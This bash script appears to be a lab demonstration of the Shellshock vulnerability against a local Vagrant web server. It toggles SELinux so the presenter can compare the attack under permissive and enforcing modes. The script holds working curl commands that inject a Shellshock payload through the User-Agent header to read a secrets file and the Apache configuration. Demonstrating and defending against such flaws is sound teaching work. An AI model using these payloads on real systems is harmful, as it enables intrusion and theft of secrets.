#!/bin/bash

URL="http://web.vm.local"
SHELL_SCRIPT="${URL}/cgi-bin/shellshock.cgi"

RED='\033[0;31m'   # Continue prompt
GREEN='\033[0;32m' # Script info
BLUE='\033[0;34m'  # Command to be run
WHITE='\033[0;37m' # Command output
NC='\033[0m'       # No Color

# Handle CTRL-C
function ctrl_c() {
    echo -e "${NC}"
    vagrant ssh web -c "sudo setenforce 1" 2> /dev/null
    exit 0
}
trap ctrl_c INT

function echo_cmd() {
    # Print and execute command
    echo -e "${BLUE}$@${NC}"
    read trash
    "$@"

    # Wait to continue
    echo
    echo -ne "${RED}"
    read -p "Continue? " trash
    echo -ne "${NC}"
}

function exploit() {
    BASE_PAYLOAD="() { :; }; echo;"

    echo_cmd curl -A "${BASE_PAYLOAD} /bin/cat /home/vagrant/secrets.txt" ${SHELL_SCRIPT}
    echo_cmd curl -A "${BASE_PAYLOAD} /bin/head /etc/httpd/conf/httpd.conf" ${SHELL_SCRIPT}
}

echo -e "${GREEN}From the webserver, run the command:"
echo -e "sudo tail -n0 -f /var/log/audit/audit.log | grep shellshock${NC}"
echo -ne "${RED}"
read -p "Continue? " trash
echo -ne "${NC}"

# Show webserver is running
echo_cmd curl "${URL}"
echo_cmd curl "${SHELL_SCRIPT}"

# Set SELinux to permissive mode
cd vagrant
echo -e "${GREEN}Setting SELinux to permissive mode${NC}"
vagrant ssh web -c "sudo setenforce 0" 2> /dev/null

exploit

# Set SELinux to enforcing mode
echo -e "${GREEN}Setting SELinux to enforcing mode${NC}"
vagrant ssh web -c "sudo setenforce 1" 2> /dev/null

exploit

cd ..
echo -e "${GREEN}Finished${NC}"
